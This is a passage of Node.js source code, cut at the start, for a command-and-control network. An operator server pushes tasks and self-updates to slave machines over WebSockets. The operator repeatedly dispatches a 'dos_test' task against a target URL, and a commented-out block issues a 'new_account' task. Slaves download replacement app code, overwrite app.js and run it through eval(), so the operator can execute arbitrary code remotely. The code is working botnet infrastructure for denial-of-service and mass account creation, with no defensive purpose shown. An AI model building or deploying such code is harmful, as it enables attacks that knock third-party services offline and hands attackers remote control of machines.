            ConsoleLogger("[SERVER] -> [API] -> [SUCCESS] -> " + 'Connected to DB');
        }).catch((error) => {
            ConsoleLogger("[SERVER] -> [API] -> [ERROR] -> " + 'Failed to connect to DB', error);
        });

        if (PC_RANK == "operator"){
            ConsoleLogger("[SERVER] -> [SUCCESS] -> " + "Starting operator web socket!");

            ExpressApp.get("/", (req, res) => {
                ConsoleLogger(req.clientIp || "no!")
                return res.send("Hi");
            })
            
            ExpressApp.ws("/server_socket", (Client, Request) => { // make a connection request to (url:443/server_socket);
                Request.clientIp = Request.clientIp || Client._socket.remoteAddress;
                Request.clientIp = Request.clientIp.replace("::ffff:", "");

                if (SocketIPs[Request.clientIp.toString()]) {
                    Client.send("Bad connection 1");
                    return Client.close();
                }; // Filter out mass connections from the same IP
                
                if (typeof Servers[Request.clientIp.toString()] == "undefined" || Servers[Request.clientIp.toString()] == null){
                    Client.send("Bad connection 2");
                    return Client.close();
                } // Someone tried to connect to our socket without being whitelisted in the server array / class!
        
                const ClientIP = Request.clientIp.toString();
                const ServerRank = (typeof Servers[ClientIP] != "undefined") ? Servers[ClientIP] : "unknown";
        
                ConsoleLogger(`Connection rank: ${ServerRank}, Status: opened!`);
    
                SocketIPs[ClientIP] = Client;
                CurrentTasks[ClientIP] = false;

                if (ServerRank == "operator"){
                    Client.on("message", (Message) => {
                        InputHandler(Message, ServerRank)
                    })
                    
                    setInterval(() => {
                        fs.readFile("app.js", "utf8", (Error, FileData) => {
                            fs.readFile("package.json", "utf8", (Error, PackageData) => {
                                fs.readFile("package-lock.json", "utf8", (Error, PackageLockData) => {
                                    if (!Error){

                                        WebSocketInstance.clients.forEach((Worker) => { // Go through the clients list grabbing each client 1 by 1
                                            Worker.send(JSON.stringify({
                                                type: "connection_time",
                                                AuthKey: OperationKey.toString()
                                            }));

                                            if (!CompareRank(Worker) & !IsDoingTask(Worker)){ // Stops it from sending a message to the operator!
                                                Worker.send(JSON.stringify({
                                                    type: "app_version",
                                                    data: {
                                                        version: AppVersion.toString(),
                                                        app_file: Buffer.from(FileData.toString()).toString('base64'),
                                                        package_file: Buffer.from(PackageData.toString()).toString('base64'),
                                                        package_lock_file: Buffer.from(PackageLockData.toString()).toString('base64')
                                                    },
                                                    AuthKey: OperationKey.toString()
                                                }));
                                            }
                                        });

                                    }
                                })
                            })
                        })

                        InputHandler(JSON.stringify({
                            type: "task",
                            command: "dos_test",
                            AuthKey: OperationKey.toString(),
                            target_url: "https://nettarget.xyz"
                        }), ServerRank)

                        /*InputHandler(JSON.stringify({
                            type: "task",
                            command: "new_account",
                            AuthKey: OperationKey.toString(),
                            total: 5
                        }), ServerRank)*/
                    }, 1000)
                }else{
                    Client.on("message", (Message) => {
                        if (ServerRank == "slave") {
                            TaskHandler(Client, Message)
                        }
                    })
                }

                Client.on("close", () => {
                    SocketIPs[ClientIP] = null || undefined;
                    CurrentTasks[ClientIP] = null || undefined;

                    ConsoleLogger(`Connection rank: ${ServerRank}, Status: closed!`);
                })
            });
        }
    
        const ExpressServer = ExpressApp.listen(AppPort, () => { // Listen for a connection to our web server port
            ConsoleLogger("[SERVER] -> [SUCCESS] -> " + "App listening on port " + AppPort);
        }); // if it's connecting to a server it'll need the prcess env port
    
        try {
            if (PC_RANK == "slave"){
                const NewWebClient = new ClientWebSocket(); // create the slaves web client object

                NewWebClient.on('connectFailed', function(error) {
                    //ConsoleLogger("[SERVER] -> [SOCKET] -> [ERROR] -> " + 'Failed to connect to master server / socket, retrying!');

                    ConnectionTime = new Date()
                    ClientConnected = false
                    DoingTask = false

                    StopTasks()
                });

                NewWebClient.on("connect", (Client) => { // Wait for the slave to connect to the master server socket
                    CurrentClient = Client
                    ConsoleLogger("Client connected!")

                    StopTasks()

                    ConnectionTime = new Date()
                    ClientConnected = true

                    if (CurrentClient){
                        DoingTask = false
                        CurrentClient.send(JSON.stringify({
                            doing_task: false
                        }));
                    }

                    Client.on("close", () => {
                        ConsoleLogger("Client disconnected!")
                        DoingTask = false

                        StopTasks()

                        ConnectionTime = new Date()
                        ClientConnected = false
                    })

                    Client.on("message", (Message) => {
                        InputHandler(Message.utf8Data, PC_RANK) // Send the message from the master server to the input handler
                    });
                
                }); // Listen for the messages from our master server
                
                let AppVersionInter = null
                AppVersionInter = setInterval(() => {
                    if (!StopConnection & !ClientConnected){
                        ConsoleLogger("Reconnecting")
                        NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
                    }

                    if (AppVersion != CurrentVersion & typeof CurrentClient != "undefined"){
                        
                        fs.readFile("app.js", "utf8", (Error, FileData) => {
                            if (!Error){
                                fs.writeFile(`app_backups/${(new Date() / 1000).toString().toString()}.app.js`, FileData.toString(), () => {
                                    fs.writeFile(`app.js`, NewAppCode.toString(), () => {
                                        ConsoleLogger("[SERVER] -> [UPDATE] -> [PENDING] -> " + 'Updating server');
                                        clearInterval(AppVersionInter);
                                        StopConnection = true;
                                        DoingTask = false;

                                        if (CurrentClient){
                                            CurrentClient.send(JSON.stringify({
                                                doing_task: false
                                            }));
                                        }
                                        
                                        CurrentClient.close();
                                        ExpressServer.close();
                                        
                                        StopTasks();
                                        
                                        setTimeout(() => {
                                            try{
                                                ConsoleLogger("[SERVER] -> [UPDATE] -> [SUCCESS] -> " + 'Server updated!');
                                                eval(NewAppCode.toString());
                                            } catch(update_error){
                                                ConsoleLogger("[SERVER] -> [UPDATE] -> [FAILLED] -> " + 'Failed to update server!', update_error);
                                            };
                                        }, 1000);
                                    })
                                })
                            }
                        })

                    }

                    if (ClientConnected & !StopConnection){
                        if ( Math.floor( Math.abs( ( ( new Date().getTime() - ConnectionTime.getTime() ) / 1000) ) ) >= 6 ) {
                            ConsoleLogger("Socket down?")
                            CurrentClient.close();
                        }
                    }

                }, 1000)
            }else if (PC_RANK == "operator"){
                ConsoleLogger("Connecting up master client socket")
                const NewWebClient = new ClientWebSocket(); // create the masters web client object
                NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket"); // we want the master / operator to make itself a connection so we can send out our signals from it
            };
        }catch (listen_socket_error){
            ConsoleLogger("[SERVER] -> [ERROR] -> failed to connect to clients web socket, " + listen_socket_error);
        }
    }).catch(() => {})
}catch (app_error){
    ConsoleLogger("[SERVER] -> [ERROR] -> error while trying to start server, " + app_error);
};